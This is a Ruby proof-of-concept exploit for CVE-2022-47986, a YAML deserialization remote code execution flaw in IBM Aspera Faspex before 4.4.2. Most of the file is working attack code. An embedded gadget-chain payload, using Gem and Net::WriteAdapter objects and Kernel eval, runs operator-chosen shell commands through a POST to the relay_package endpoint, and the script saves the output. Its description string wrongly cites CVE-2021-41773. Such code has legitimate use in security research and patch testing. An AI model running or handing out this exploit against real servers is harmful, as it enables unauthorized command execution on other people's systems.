#!/usr/bin/env ruby
# frozen_string_literal: true

##
# This file implements a POC for CVE-2022-47986
# an YAML deserialization that causes a RCE in
# IBM Aspera Faspex (before 4.4.2).

###################
#    This file implements a POC for CVE-2022-47986.
#    Copyright (C) 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

##
# Project version
VERSION = '1.0.0'

##
# Project author
AUTHOR = 'Maurice Lambert'

##
# E-mail of the author of the project
AUTHOR_EMAIL = 'mauricelambert434@gmail.com'

##
# Project maintainer
MAINTAINER = 'Maurice Lambert'

##
# E-mail of the maintainer of the project
MAINTAINER_EMAIL = 'mauricelambert434@gmail.com'

##
# Project description
DESCRIPTION = '
This script exploits CVE-2021-41773 to print file or/and execute command.
'

##
# Project license
LICENSE = 'GPL-3.0 License'

##
# Project url
URL = 'https://github.com/mauricelambert/CVE-2022-47986'

##
# Project copyright
COPYRIGHT = '
CVE-2022-47986  Copyright (C) 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
'

puts "#{COPYRIGHT}\n"

require 'net/http'
require 'optparse'
require 'ostruct'

##
# This class implements methods to exploit CVE-2022-47986
# to execute command with ruby.
class CVE202247986
  ##
  # This function gets target host from the STDIN

  def self.get_stdin_host
    print 'Host (target): '
    gets.strip
  end

  ##
  # This function parses command line arguments

  def self.parse_args
    options = OpenStruct.new
    options.output = $stdout

    OptionParser.new do |opt|
      opt.on(
        '-c',
        '--commands COMMAND1;COMMAND2;...',
        'A list of semicolon-separate commands.'
      ) do |commands|
        options.commands = commands
      end
      opt.on(
        '-o',
        '--output FILENAME',
        'A output file to write file or command output'
      ) { |filename| options.output = File.new(filename, 'w') }
    end.parse!

    options.host = ARGV[0] || get_stdin_host
    options
  end

  ##
  # The main function to launch the attack

  def self.main
    arguments = parse_args

    url = "https://#{arguments.host}/aspera/faspex/package_relay/relay_package"
    response = nil

    unless arguments.commands.nil?
      commands = arguments.commands
    else
      commands = "id"
    end

    exploit = %q#
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "pew"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:PrettyPrint
             output: !ruby/object:Net::WriteAdapter
                 socket: &1 !ruby/module "Kernel"
                 method_id: :eval
             newline: "throw `commands`"
             buffer: {}
             group_stack:
              - !ruby/object:PrettyPrint::Group
                break: true
         method_id: :breakable
      #.gsub(/commands/, commands).gsub(/\n/, "\\n").gsub(/"/, "\\\"")

    uri = URI(url)
    request = Net::HTTP::Post.new(uri)
    request.body = %q#{
  "package_file_list": [
    "/"
  ],
  "external_emails": "exploit",
  "package_name": "assetnote_pack",
  "package_note": "hello from assetnote team",
  "original_sender_name": "assetnote",
  "package_uuid": "d7cb6601-6db9-43aa-8e6b-dfb4768647ec",
  "metadata_human_readable": "Yes",
  "forward": "pew",
  "metadata_json": "{}",
  "delivery_uuid": "d7cb6601-6db9-43aa-8e6b-dfb4768647ec",
  "delivery_sender_name": "assetnote",
  "delivery_title": "TEST",
  "delivery_note": "TEST",
  "delete_after_download": true,
  "delete_after_download_condition": "IDK"
}#.gsub(/exploit/, exploit)

    Net::HTTP.start(
      uri.hostname, uri.port,
      use_ssl: uri.scheme == 'https'
    ) { |http| response = http.request(request) }

    arguments.output.write(response.body)
    0
  end
end

exit(CVE202247986.main) if __FILE__ == $PROGRAM_NAME
